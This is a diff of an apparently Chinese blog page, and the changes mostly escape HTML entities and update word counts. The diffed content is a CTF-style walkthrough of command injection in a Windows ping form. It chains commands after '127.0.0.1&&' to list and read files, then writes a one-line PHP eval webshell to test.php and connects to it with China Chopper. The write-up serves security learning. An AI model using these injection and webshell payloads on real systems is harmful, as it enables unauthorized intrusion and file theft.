@@ -428,7 +428,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        370
+                        385
                     </div>
                     
 
@@ -471,39 +471,39 @@
 <ol start="2">
 <li>测试远程命令执行漏洞</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/eF2kMByYJKTWlhb.png" alt="command-2.png"></p>
 <ol start="3">
 <li>查看当前目录下有哪些文件</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/Sre2yMXibf8EIlD.png" alt="command-3.png"></p>
 <ol start="4">
 <li>使用目录遍历命令查找 flag.php 文件</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&for /r C:\phpStudy\WWW %i in (flag)  do @echo %i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;for /r C:\phpStudy\WWW %i in (flag)  do @echo %i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/DmKPvyUwLtB8AfV.png" alt="command-4.png"></p>
 <ol start="5">
 <li>尝试使用 type 命令查看 flag.php 文件</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&type C:\phpStudy\WWW\flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;type C:\phpStudy\WWW\flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/ygxUH4VvKC78oTD.png" alt="command-5.png"></p>
 <p>发现无法查看 flag.php 文件</p>
 <ol start="6">
 <li>尝试查看当前目录下的 index.php</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&type index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;type index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/dVTbP5kqhJQjngp.png" alt="command-6.png"></p>
 <p>index.php 文件能够查看，猜测可能是权限问题导致无法访问 flag.php</p>
 <ol start="7">
 <li>尝试写入 webshell，通过 webshell 来访问文件</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&echo ^<? eval(@$_POST['a']) ; ?^> > test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;echo ^<!--? eval(@$_POST['a']) ; ?^--> &gt; test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/1hcz4S2JtqpHM97.png" alt="command-7.png"></p>
 <ol start="8">
 <li>查看一句话木马是否写入成功</li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/t2QpLjwiPvl7fgO.png" alt="command-8.png"></p>
 <ol start="9">
 <li>使用中国菜刀连接 webshell，最后在 WWW 目录下查看 flag.php</li>
@@ -785,7 +785,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.8k</span>&nbsp;字
+                class="white-color">39.8k</span>&nbsp;字
                
             
 			
